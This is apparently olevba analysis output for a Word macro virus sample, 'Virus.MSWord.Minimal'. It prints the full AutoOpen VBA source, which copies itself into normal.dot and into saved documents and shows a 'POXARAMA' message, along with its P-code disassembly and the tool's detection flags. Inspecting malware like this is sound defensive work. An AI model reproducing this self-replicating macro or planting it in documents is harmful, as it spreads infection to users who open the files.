olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Minimal.s
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Minimal.s - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Minimal.s - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Dim N$
Dim Msg$
Rem AutoOpen Macro
Dim wiz As Object: Set wiz = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs wiz

On Error GoTo -1: On Error GoTo PoX
If wiz.Format = 0 Then
wiz.Format = 1
N$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "normal.dot:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 4
WordBasic.FileSaveAs wiz
End If

WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "normal.dot:AutoOpen", 4
Msg$ = Msg$ + " May a PoX be upon you Sam I am "
WordBasic.MsgBox Msg$, "               POXARAMA"
PoX:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Minimal.s
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 1876 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Public Sub MAIN())
' Line #3:
' 	Dim 
' 	VarDefn N
' Line #4:
' 	Dim 
' 	VarDefn Msg
' Line #5:
' 	Rem 0x000F " AutoOpen Macro"
' Line #6:
' 	Dim 
' 	VarDefn wiz (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set wiz 
' Line #7:
' 	Ld wiz 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError PoX 
' Line #10:
' 	Ld wiz 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld wiz 
' 	MemSt Format$ 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St N$ 
' Line #13:
' 	LitStr 0x0013 "normal.dot:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #14:
' 	Ld wiz 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #15:
' 	EndIfBlock 
' Line #16:
' Line #17:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0013 "normal.dot:AutoOpen"
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #18:
' 	Ld Msg$ 
' 	LitStr 0x0020 " May a PoX be upon you Sam I am "
' 	Add 
' 	St Msg$ 
' Line #19:
' 	Ld Msg$ 
' 	LitStr 0x0017 "               POXARAMA"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #20:
' 	Label PoX 
' Line #21:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

